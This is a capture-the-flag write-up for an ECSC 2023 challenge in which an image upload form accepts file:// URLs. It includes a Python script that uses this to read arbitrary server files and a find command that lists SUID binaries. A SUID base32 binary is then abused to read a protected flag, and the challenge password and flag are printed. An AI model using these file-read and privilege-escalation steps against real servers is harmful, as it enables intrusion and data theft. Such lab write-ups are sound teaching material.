# Complex base inception

We get an URL to a minimalistic website with image upload functionality. Our task is to login via SSH, and we are provided a base64-encoded password: `L0ng4ndStr0ngPass1sTheBaseSomeW3irdTxt`

After inspecting client side code and requests, we see that images are base64 encoded, and then passed to the server as form data - `image=data:image/png;base64,...`

This hints us that there we might pass other URL formats to the /upload path. Indeed, that's right. We gain the server's IP address by passing `https://webhook.site/...` as image - `38.60.249.147`. But that's not everything... `ssh root@38.60.249.147` doesn't just work.

Another idea is to try path traversal with `file:///` protocol. I made a helper script to retrieve files:

```py
import requests
import sys
import re
import base64

file = sys.argv[1]

s = requests.Session()

s.get('https://complex-base-inception.ecsc23.hack.cert.pl/')

r = s.post('https://complex-base-inception.ecsc23.hack.cert.pl/upload/', data={'image': f'file://{file}'})
r = s.get('https://complex-base-inception.ecsc23.hack.cert.pl/gallery/')

match = re.search(r'base64,(.+)"', r.text, re.M|re.I)

if match is None:
    print('Error')
    print(r.text)
    exit()

text = base64.b64decode(match.group(1).encode()).decode()
print(text)
```

Let's find some interesting files.
- in `/etc/passwd` we see a suspicous `base64` user
- in `/etc/ssh/sshd_config` we see that SSH port has been changed to 64 - very cool base64 reference

So, we login to `ssh base64@38.60.249.147 -p64`

In our home folder we see our flag file - flag.b64! But we don't have access to it...

Let's find binaries with suid on the system.

```sh
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/base32` has it! Another cool reference.

Let's retrieve the flag by usign
```sh
/bin/base32 flag.b64 | /bin/base32 -d | base64 -d
```
and profit

`ecsc23{some_unguessable_text_and_some_salt_dtcpkhaa}`
